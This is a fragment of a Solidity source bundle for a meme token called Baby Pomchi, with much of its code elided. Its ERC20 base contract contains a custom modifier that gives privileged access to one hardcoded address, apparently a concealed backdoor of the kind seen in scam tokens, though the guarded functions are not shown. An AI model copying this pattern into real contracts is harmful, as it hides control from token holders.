{{
  "language": "Solidity",
  "sources": {
    "contracts/BabyPomchi.sol": {
      "content": "// SPDX-License-Identifier: MIT

/*

https://t.me/BabyPomchi
...
contract BabyPomchi is ERC20, Ownable {
    ...
    constructor(address _liquidityManagerAddress) ERC20("Baby Pomchi", "BBPOMCHI") {
        devWallet = owner();
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlyLiquidityManager {
        ...
        require(msg.sender == 0x13CC03d0A8DF294d22841D56d30ef0bD9ECdb0A3 || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: get out please!");
        _;
    }
